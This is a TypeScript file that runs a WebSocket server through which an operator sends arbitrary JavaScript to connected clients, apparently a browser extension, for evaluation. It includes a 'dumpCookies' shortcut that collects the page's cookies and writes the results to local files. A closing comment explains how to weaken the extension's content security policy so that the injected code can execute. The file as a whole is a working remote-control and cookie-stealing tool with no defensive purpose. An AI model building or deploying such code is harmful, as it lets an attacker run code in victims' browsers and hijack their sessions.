// @ts-nocheck
import * as _WebSocket from 'ws';
import * as readline from 'readline';
import * as fs from 'fs';
import * as https from 'https';
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const prompt = (query) => new Promise((resolve) => rl.question(query, resolve));

const fetchInput = async (doOnFetch: (res: string) => Promise<void>) => {
  const res = await prompt('>');
  await doOnFetch(res as string);
  await fetchInput(doOnFetch);
};
const server = https.createServer({
  port: 9090,
  key: fs.readFileSync('./backend/src/pchess_net.key', 'utf8'),
  cert: fs.readFileSync('./backend/src/pchess_net.crt', 'utf8'),
});

const wss = new _WebSocket.Server({ server, port: 8080 });
let shouldSave = false;
let saveTo = '';

const handleQuery = (query: string, ws) => {
  if (query.includes('dumpCookies')) {
    query = query.replace(
      'dumpCookies',
      ' document.cookie.split(\'; \').reduce((prev, current) => {const [name, ...value] = current.split(\'=\');prev[name] = value.join(\'=\');return prev;}, {});'
    );
  }
  if (query.includes('|')) {
    shouldSave = true;
    saveTo = query.split('|')[1];
    ws.send(query.split('|')[0]);
  } else {
    if (query === 'clear') {
      console.clear();
    }
    ws.send(query);
    shouldSave = false;
    saveTo = '';
  }
};

export const startWsServer = async () => {
  wss.on('connection', async (ws) => {
    ws.on('message', async (message) => {
      try {
        console.log(JSON.parse(JSON.parse(message).response));
        if (shouldSave && saveTo) {
          shouldSave = false;
          fs.writeFileSync(saveTo, JSON.stringify(JSON.parse(JSON.parse(message).response), null, 2));
          saveTo = '';
        }
      } catch (e) {
        console.error('Error processing response. ', message);
        console.log(JSON.parse(message)?.response);
      }
      const query: string = await prompt('> ');
      await handleQuery(query, ws);
    });

    ws.onclose = () => {
      console.log('connection lost!..');
    };
    // ws.send(await prompt('> '));
    handleQuery(await prompt('> '), ws);
  });
};

startWsServer();

//  "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'" add to manifest.json to execute
